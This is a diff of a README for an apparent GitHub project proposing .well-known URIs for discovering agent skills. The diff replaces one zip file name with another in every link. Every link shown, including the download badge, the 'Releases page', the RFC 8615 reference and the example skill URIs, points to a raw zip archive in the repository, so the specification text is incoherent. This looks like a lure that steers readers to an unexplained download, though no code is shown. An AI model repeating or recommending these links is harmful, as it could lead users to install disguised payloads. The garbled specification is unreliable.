@@ -1,7 +1,7 @@
 # 🌟 agent-skills-discovery-rfc - Discover Agent Skills Easily
 
 ## 📥 Download Here
-[![Download Latest Version](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip%20Latest%https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip)](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip)
+[![Download Latest Version](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip%20Latest%https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip)](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip)
 
 ## 📖 Table of Contents
 
@@ -21,7 +21,7 @@
 
 ## 📜 Abstract
 
-This document defines a way to find [Agent Skills](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip) using the `.well-known` URI path. The approach follows the standard set in [RFC 8615](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip). Currently, agent skills are found in many places, making them hard to locate. This method streamlines the process by centralizing skill discovery.
+This document defines a way to find [Agent Skills](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip) using the `.well-known` URI path. The approach follows the standard set in [RFC 8615](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip). Currently, agent skills are found in many places, making them hard to locate. This method streamlines the process by centralizing skill discovery.
 
 ## ❓ Problem
 
@@ -36,7 +36,7 @@ The solution is to introduce a well-known URI structure. This allows users to ac
 The URI structure is designed to be simple. Users can append `.well-known` to a base URI. For example:
 
 ```
-https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip
+https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip
 ```
 
 This link will direct users to a page that lists available skills. 
@@ -65,11 +65,11 @@ The discovery index serves as a curated list of skills. It helps users quickly i
 Here are a few examples of how the well-known URIs can connect to specific skills:
 
 1. **Language Translation Skill**:  
-   URI: `https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip`  
+   URI: `https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip`  
    Description: This skill translates text from one language to another.
 
 2. **Weather Forecast Skill**:  
-   URI: `https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip`  
+   URI: `https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip`  
    Description: This skill provides current weather updates for a specified location.
 
 These examples illustrate how users can access different skills through simple and clear links.
@@ -98,9 +98,9 @@ This approach aligns with several existing specifications that also focus on URI
 
 ## 📖 References
 
-- [RFC 8615 - Well-Known URIs](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip)
-- [Agent Skills Documentation](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip) 
+- [RFC 8615 - Well-Known URIs](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip)
+- [Agent Skills Documentation](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip) 
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/discovery_skills_rfc_agent_2.3-beta.5.zip). Here, you'll find the latest version available for download.
+To download the application, visit the [Releases page](https://github.com/zurats/agent-skills-discovery-rfc/raw/refs/heads/main/examples/skills_rfc_discovery_agent_2.2.zip). Here, you'll find the latest version available for download.
